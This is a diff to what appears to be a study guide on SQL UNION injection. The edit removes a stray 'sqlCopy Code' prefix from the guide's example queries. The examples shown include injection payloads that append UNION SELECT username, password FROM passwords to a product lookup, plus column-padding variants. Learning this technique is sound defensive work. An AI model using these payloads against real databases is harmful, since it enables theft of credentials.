@@ -13,7 +13,7 @@ SQL Union Injection is a type of attack that exploits vulnerabilities in web app
 *   Example:
 
     ```sql
-    sqlCopy CodeSELECT * FROM ports UNION SELECT * FROM ships;
+    SELECT * FROM ports UNION SELECT * FROM ships;
     ```
 
     * This combines results from both the `ports` and `ships` tables.
@@ -28,7 +28,7 @@ SQL Union Injection is a type of attack that exploits vulnerabilities in web app
 
        {% code overflow="wrap" %}
        ```sql
-       sqlCopy CodeSELECT city FROM ports UNION SELECT * FROM ships;  -- Error due to different column counts
+       SELECT city FROM ports UNION SELECT * FROM ships;  -- Error due to different column counts
        ```
        {% endcode %}
 3. **Injecting UNION Queries:**
@@ -36,7 +36,7 @@ SQL Union Injection is a type of attack that exploits vulnerabilities in web app
 
        {% code overflow="wrap" %}
        ```sql
-       sqlCopy CodeSELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- '
+       SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- '
        ```
        {% endcode %}
    * This assumes the `products` table has two columns.
@@ -46,7 +46,7 @@ SQL Union Injection is a type of attack that exploits vulnerabilities in web app
 
        {% code overflow="wrap" %}
        ```sql
-       sqlCopy CodeSELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords;
+       SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords;
        ```
        {% endcode %}
    * Use `NULL` or numbers as junk data to match data types.
@@ -54,6 +54,6 @@ SQL Union Injection is a type of attack that exploits vulnerabilities in web app
    *   If the original query has four columns:
 
        ```sql
-       sqlCopy CodeUNION SELECT username, 2, 3, 4 FROM passwords-- '
+       UNION SELECT username, 2, 3, 4 FROM passwords-- '
        ```
    * This will return the username in the first column, with numbers filling the others.
